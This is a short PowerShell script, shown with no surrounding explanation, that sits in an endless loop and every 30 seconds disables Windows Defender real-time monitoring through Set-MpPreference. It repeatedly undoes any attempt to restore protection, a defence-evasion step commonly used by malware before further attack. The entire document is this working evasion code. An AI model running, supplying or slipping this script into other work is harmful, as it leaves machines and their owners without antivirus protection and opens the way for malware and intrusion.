 while(1)
{
   Set-MpPreference -DisableRealtimeMonitoring $true

   start-sleep -seconds 30
}
